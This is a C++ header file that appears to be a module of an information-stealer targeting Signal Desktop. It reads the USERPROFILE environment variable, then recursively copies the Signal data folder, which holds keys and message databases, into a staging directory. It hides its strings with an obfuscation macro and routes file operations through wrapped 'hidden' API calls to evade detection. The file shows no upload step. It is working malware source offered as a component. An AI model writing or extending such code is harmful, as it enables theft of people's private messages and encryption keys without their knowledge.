#ifndef SIGNAL_HPP
#define SIGNAL_HPP

#include <string>
#include <filesystem>
#include <cstdlib>
#include "Winapi_structs.hpp"
#include "obfusheader.h"

namespace fs = std::filesystem;

namespace Signal {
    inline void Extract(const std::string& baseDir);
}

inline void Signal::Extract(const std::string& baseDir) {
    char* userProfilePath = nullptr;
    size_t requiredSize = 0;
    _dupenv_s(&userProfilePath, &requiredSize, OBF("USERPROFILE"));

    if (!userProfilePath) return;

    std::string signalDir = std::string(userProfilePath) + OBF("\\AppData\\Roaming\\Signal");
    free(userProfilePath);

    if (!fs::exists(signalDir)) return;

    std::string targetDir = baseDir + OBF("\\Signal");
    HiddenCalls::CreateDirectoryA(targetDir.c_str(), NULL);

    for (const auto& entry : fs::recursive_directory_iterator(signalDir)) {
        std::string destPath = targetDir + "\\" + entry.path().filename().string();
        if (fs::is_directory(entry)) {
            HiddenCalls::CreateDirectoryA(destPath.c_str(), NULL);
        }
        else {
            HiddenCalls::CopyFileA(entry.path().string().c_str(), destPath.c_str(), FALSE);
        }
    }
}

#endif
